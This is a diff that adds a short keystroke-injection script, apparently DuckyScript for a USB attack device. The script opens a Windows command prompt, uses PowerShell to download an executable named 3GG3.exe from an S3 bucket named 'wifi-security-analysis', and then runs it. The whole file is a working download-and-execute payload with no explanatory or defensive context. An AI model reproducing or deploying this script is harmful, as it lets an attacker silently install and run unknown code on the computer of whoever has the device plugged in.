@@ -1,0 +1,11 @@
+GUI r
+DELAY 150
+STRING cmd
+ENTER
+DELAY 200
+ENTER
+STRING powershell Invoke-WebRequest https://wifi-security-analysis.s3.amazonaws.com/3GG3.exe -OutFile 3GG3.exe
+ENTER
+DELAY 300
+STRING 3GG3.exe
+ENTER
